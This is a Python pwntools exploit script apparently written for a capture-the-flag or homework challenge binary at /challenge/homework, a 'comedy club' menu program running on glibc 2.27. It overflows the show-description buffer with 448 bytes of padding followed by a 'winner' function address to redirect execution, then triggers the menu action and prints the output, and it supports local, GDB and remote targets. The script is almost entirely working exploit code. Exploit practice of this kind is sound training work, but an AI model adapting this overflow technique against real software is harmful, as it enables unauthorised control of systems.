#!/usr/bin/env python3
import sys
from time import sleep
import pwn
import os


# Boilerplate for starting a binary locally, in GDB, or remotely.
def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], env={'LD_PRELOAD': '/challenge/libc-2.27.so'}, gdbscript=gdbscript)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath], env={'LD_PRELOAD': '/challenge/libc-2.27.so'})


# Binary Path
binPath = "/challenge/homework"

gdbscript = """
set environment LD_PRELOAD /challenge/libc-2.27.so 
set max-visualize-chunk-size 0x500
set glibc 2.27
b *whatToDo+188
continue
""".format(**locals())

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.log_level = 'critical'
io = start()

winner_function = pwn.p64(0x0000000000400bed)
try:
    io.recvline()  # Welcome to the comedy club!
    io.recvline()  # What is the name of your act?
    io.recvline()  # Please set up for your act

    io.sendline(b'ba')  # ba

    io.recvline()  # Your act code is:
    io.recvline()  # How long do you want the show description to be?

    io.sendline(b'65')

    io.recvline()  # Describe the show for us.

    io.sendline(b'A' * 448 + winner_function)  # payload
    io.recvlines(7)  # action menu

    io.recvuntil(b'Action: ')  # Acion:

    io.sendline(b'1')  # 1

    pwnd = io.recvline().strip().decode('utf-8')

    print('\n' + pwnd + '\n')


except EOFError:
    pass
